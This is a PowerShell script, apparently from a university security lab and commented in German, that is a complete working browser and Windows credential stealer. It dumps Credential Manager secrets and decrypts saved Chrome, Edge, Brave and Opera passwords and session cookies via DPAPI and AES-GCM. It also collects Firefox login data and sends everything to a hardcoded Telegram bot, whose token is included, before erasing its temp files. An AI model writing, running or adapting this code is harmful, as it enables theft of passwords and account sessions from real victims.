# ============================================================
#  W02a.6 - Browser Credential & Cookie Stealer
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 - AAU Klagenfurt
#
#  Sammelt (ohne Admin-Rechte):
#    - Windows Credential Manager (CredEnumerate P/Invoke)
#    - Chrome, Edge, Brave: gespeicherte Passwoerter (AES-GCM)
#    - Chrome, Edge, Brave: Session-Cookies
#
#  Technik:
#    - winsqlite3.dll (in Windows 10/11 built-in) fuer SQLite-Zugriff
#    - DPAPI + AES-256-GCM fuer Chromium v10/v11 Passwoerter
#    - Kompatibel mit PS5.1 (x64/ARM64) und PS7
#    - AES-GCM-Entschluesslung: PS7/.NET5+ OK; PS5.1 = "(encrypted)"
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

# ── Telegram ────────────────────────────────────────────────

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── Win32 P/Invoke: CredMan + SQLite ────────────────────────

Add-Type -ErrorAction SilentlyContinue @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

public class CredMan {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr creds);
    [DllImport("advapi32.dll")]
    static extern void CredFree(IntPtr buf);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct CRED {
        public uint Flags, Type;
        public string TargetName, Comment;
        public long LastWritten;
        public uint BlobSize;
        public IntPtr Blob;
        public uint Persist, AttrCount;
        public IntPtr Attrs;
        public string Alias, UserName;
    }

    public static List<string[]> Dump() {
        var r = new List<string[]>();
        int n; IntPtr p;
        if (!CredEnumerate(null, 0, out n, out p)) return r;
        try {
            for (int i = 0; i < n; i++) {
                var c = (CRED)Marshal.PtrToStructure(Marshal.ReadIntPtr(p, i * IntPtr.Size), typeof(CRED));
                string pw = "";
                if (c.BlobSize > 0 && c.Blob != IntPtr.Zero) {
                    var b = new byte[c.BlobSize];
                    Marshal.Copy(c.Blob, b, 0, (int)c.BlobSize);
                    pw = Encoding.Unicode.GetString(b);
                }
                r.Add(new[] { c.TargetName ?? "", c.UserName ?? "", pw });
            }
        } finally { CredFree(p); }
        return r;
    }
}

public class Sqdb {
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern int sqlite3_open(string f, out IntPtr db);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern int sqlite3_prepare_v2(IntPtr db, string sql, int n, out IntPtr st, IntPtr t);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern int sqlite3_step(IntPtr st);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern IntPtr sqlite3_column_text(IntPtr st, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern IntPtr sqlite3_column_blob(IntPtr st, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern int sqlite3_column_bytes(IntPtr st, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern int sqlite3_finalize(IntPtr st);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    static extern int sqlite3_close(IntPtr db);

    const int ROW = 100;

    // Read null-terminated UTF-8 from unmanaged pointer - compatible with .NET 4.x and .NET 5+
    static string PtrToUtf8(IntPtr ptr) {
        if (ptr == IntPtr.Zero) return "";
        var buf = new List<byte>();
        int off = 0;
        byte b;
        while ((b = Marshal.ReadByte(ptr, off++)) != 0) buf.Add(b);
        return Encoding.UTF8.GetString(buf.ToArray());
    }

    // Returns rows with only text columns
    public static List<string[]> QText(string path, string sql, int cols) {
        var r = new List<string[]>();
        IntPtr db;
        if (sqlite3_open(path, out db) != 0) return r;
        try {
            IntPtr st;
            if (sqlite3_prepare_v2(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
            try {
                while (sqlite3_step(st) == ROW) {
                    var row = new string[cols];
                    for (int c = 0; c < cols; c++)
                        row[c] = PtrToUtf8(sqlite3_column_text(st, c));
                    r.Add(row);
                }
            } finally { sqlite3_finalize(st); }
        } finally { sqlite3_close(db); }
        return r;
    }

    // Returns rows with mixed text/blob columns; blobCols = indices of blob columns
    public static List<object[]> QMixed(string path, string sql, int totalCols, int[] blobCols) {
        var r = new List<object[]>();
        var blobSet = new HashSet<int>(blobCols);
        IntPtr db;
        if (sqlite3_open(path, out db) != 0) return r;
        try {
            IntPtr st;
            if (sqlite3_prepare_v2(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
            try {
                while (sqlite3_step(st) == ROW) {
                    var row = new object[totalCols];
                    for (int c = 0; c < totalCols; c++) {
                        if (blobSet.Contains(c)) {
                            IntPtr bp = sqlite3_column_blob(st, c);
                            int len = sqlite3_column_bytes(st, c);
                            var b = new byte[bp != IntPtr.Zero && len > 0 ? len : 0];
                            if (b.Length > 0) Marshal.Copy(bp, b, 0, len);
                            row[c] = b;
                        } else {
                            row[c] = PtrToUtf8(sqlite3_column_text(st, c));
                        }
                    }
                    r.Add(row);
                }
            } finally { sqlite3_finalize(st); }
        } finally { sqlite3_close(db); }
        return r;
    }
}
"@

Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue

# ── Chrome/Edge AES-GCM Entschluesslung ─────────────────────

function Get-ChromeMasterKey {
    param([string]$UserDataPath)
    try {
        $ls = Join-Path $UserDataPath "Local State"
        if (-not (Test-Path $ls)) { return $null }
        $json = [IO.File]::ReadAllText($ls) | ConvertFrom-Json
        $b64  = $json.os_crypt.encrypted_key
        if (-not $b64) { return $null }
        # Strip 5-byte "DPAPI" prefix, then DPAPI-decrypt
        $raw = [Convert]::FromBase64String($b64)[5..999999]
        return [Security.Cryptography.ProtectedData]::Unprotect(
            $raw, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

function Decrypt-ChromeBlob {
    param([byte[]]$Blob, [byte[]]$MasterKey)
    if (-not $Blob -or $Blob.Length -lt 3) { return "" }
    $pfx = [Text.Encoding]::ASCII.GetString($Blob[0..2])

    if ($pfx -notin @("v10","v11")) {
        # Pre-Chrome-80: plain DPAPI
        try {
            return [Text.Encoding]::UTF8.GetString(
                [Security.Cryptography.ProtectedData]::Unprotect(
                    $Blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
        } catch { return "(DPAPI err)" }
    }

    if (-not $MasterKey) { return "(v10/v11 - kein MasterKey)" }

    # v10/v11: [3B prefix][12B IV][ciphertext][16B auth-tag]
    $iv   = $Blob[3..14]
    $rest = $Blob[15..($Blob.Length-1)]
    $ct   = $rest[0..($rest.Length-17)]
    $tag  = $rest[($rest.Length-16)..($rest.Length-1)]

    try {
        # AES-GCM: .NET 5+ (PS7 / pwsh) only
        $aes = [Security.Cryptography.AesGcm]::new([byte[]]$MasterKey)
        $pt  = New-Object byte[] $ct.Length
        $aes.Decrypt([byte[]]$iv, [byte[]]$ct, [byte[]]$tag, $pt)
        $aes.Dispose()
        return [Text.Encoding]::UTF8.GetString($pt)
    } catch {
        # PS5.1 / .NET Framework: AesGcm nicht verfuegbar
        return "(AES-GCM - benoetigt PS7/pwsh)"
    }
}

# ── Chromium Browser-Pfade ───────────────────────────────────

$browsers = @(
    @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ Name = "Edge";   Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ Name = "Brave";  Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
    @{ Name = "Opera";  Path = "$env:APPDATA\Opera Software\Opera Stable" }
)

# ── Report aufbauen ──────────────────────────────────────────

Send-TgMessage "[CREDSTEALER] $env:COMPUTERNAME\$env:USERNAME gestartet"

$sb = [Text.StringBuilder]::new()
$null = $sb.AppendLine("=== CREDENTIAL STEALER | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $sb.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME")
$null = $sb.AppendLine("")

# ── 1. Windows Credential Manager ───────────────────────────

$null = $sb.AppendLine("== WINDOWS CREDENTIAL MANAGER ==")
try {
    $creds = [CredMan]::Dump()
    if ($creds.Count -eq 0) {
        $null = $sb.AppendLine("(keine Eintraege)")
    } else {
        foreach ($c in $creds) {
            $null = $sb.AppendLine("Target : $($c[0])")
            $null = $sb.AppendLine("User   : $($c[1])")
            $null = $sb.AppendLine("Pass   : $($c[2])")
            $null = $sb.AppendLine("")
        }
    }
} catch {
    $null = $sb.AppendLine("(CredMan P/Invoke fehlgeschlagen)")
}

# ── 2. Chromium Passwoerter & Cookies ───────────────────────

$tmpFiles = @()

foreach ($br in $browsers) {
    if (-not (Test-Path $br.Path)) { continue }

    $null = $sb.AppendLine("== $($br.Name.ToUpper()) ==")
    $masterKey = Get-ChromeMasterKey $br.Path

    # Profile-Verzeichnisse: Default + Profile N
    $profiles = @("Default") + @(
        Get-ChildItem $br.Path -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^Profile \d+$' } |
        Select-Object -ExpandProperty Name
    )

    foreach ($prof in $profiles) {
        $profPath = Join-Path $br.Path $prof
        if (-not (Test-Path $profPath)) { continue }

        # --- Gespeicherte Passwoerter ---
        $loginDb = Join-Path $profPath "Login Data"
        if (Test-Path $loginDb) {
            $null = $sb.AppendLine("-- $($br.Name) [$prof] Passwoerter --")
            try {
                $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid().ToString('N')).db"
                Copy-Item $loginDb $tmp -Force -ErrorAction Stop
                $tmpFiles += $tmp

                $rows = [Sqdb]::QMixed($tmp,
                    "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''",
                    3, @(2))

                if ($rows.Count -eq 0) {
                    $null = $sb.AppendLine("(keine gespeicherten Passwoerter)")
                } else {
                    foreach ($row in $rows) {
                        $url  = $row[0]
                        $user = $row[1]
                        $dec  = Decrypt-ChromeBlob -Blob ([byte[]]$row[2]) -MasterKey $masterKey
                        $null = $sb.AppendLine("URL  : $url")
                        $null = $sb.AppendLine("User : $user")
                        $null = $sb.AppendLine("Pass : $dec")
                        $null = $sb.AppendLine("")
                    }
                }
            } catch {
                $null = $sb.AppendLine("(Zugriff fehlgeschlagen - Browser offen?)")
            }
        }

        # --- Cookies ---
        # Chrome >= 96: Network\Cookies; aelter: Cookies
        $cookieDb = Join-Path $profPath "Network\Cookies"
        if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profPath "Cookies" }

        if (Test-Path $cookieDb) {
            $null = $sb.AppendLine("-- $($br.Name) [$prof] Cookies (Top 50) --")
            try {
                $tmp = Join-Path $env:TEMP "ck_$([Guid]::NewGuid().ToString('N')).db"
                Copy-Item $cookieDb $tmp -Force -ErrorAction Stop
                $tmpFiles += $tmp

                $rows = [Sqdb]::QMixed($tmp,
                    "SELECT host_key, name, value, encrypted_value FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
                    4, @(3))

                if ($rows.Count -eq 0) {
                    $null = $sb.AppendLine("(keine Cookies)")
                } else {
                    foreach ($row in $rows) {
                        $host  = $row[0]
                        $name  = $row[1]
                        $val   = $row[2]
                        $encv  = [byte[]]$row[3]

                        if ($val -and $val -ne "") {
                            $display = $val  # unverschluesselt (alt)
                        } elseif ($encv -and $encv.Length -gt 0) {
                            $display = Decrypt-ChromeBlob -Blob $encv -MasterKey $masterKey
                        } else {
                            $display = "(leer)"
                        }
                        $null = $sb.AppendLine("$host | $name = $display")
                    }
                    $null = $sb.AppendLine("")
                }
            } catch {
                $null = $sb.AppendLine("(Cookie-Zugriff fehlgeschlagen)")
            }
        }
    }
}

# ── 3. Firefox Credentials (logins.json - kein NSS noetig) ──

$null = $sb.AppendLine("== FIREFOX ==")
try {
    $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffBase) {
        Get-ChildItem $ffBase -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $loginsJson = Join-Path $_.FullName "logins.json"
            if (Test-Path $loginsJson) {
                $null = $sb.AppendLine("-- Profil: $($_.Name) --")
                $logins = (Get-Content $loginsJson -Raw | ConvertFrom-Json).logins
                if ($logins) {
                    foreach ($l in $logins) {
                        $null = $sb.AppendLine("URL  : $($l.formSubmitURL)")
                        $null = $sb.AppendLine("User : $($l.encryptedUsername) (NSS-verschluesselt)")
                        $null = $sb.AppendLine("Pass : $($l.encryptedPassword) (NSS-verschluesselt)")
                        $null = $sb.AppendLine("")
                    }
                } else { $null = $sb.AppendLine("(keine Logins)") }
            }
        }
    } else { $null = $sb.AppendLine("(Firefox nicht installiert)") }
} catch { $null = $sb.AppendLine("(Firefox-Zugriff fehlgeschlagen)") }

# ── Exfil & Cleanup ──────────────────────────────────────────

Send-TgFile -Filename "creds_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $sb.ToString() `
            -Caption "CredStealer - $env:COMPUTERNAME\$env:USERNAME"

$tmpFiles | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
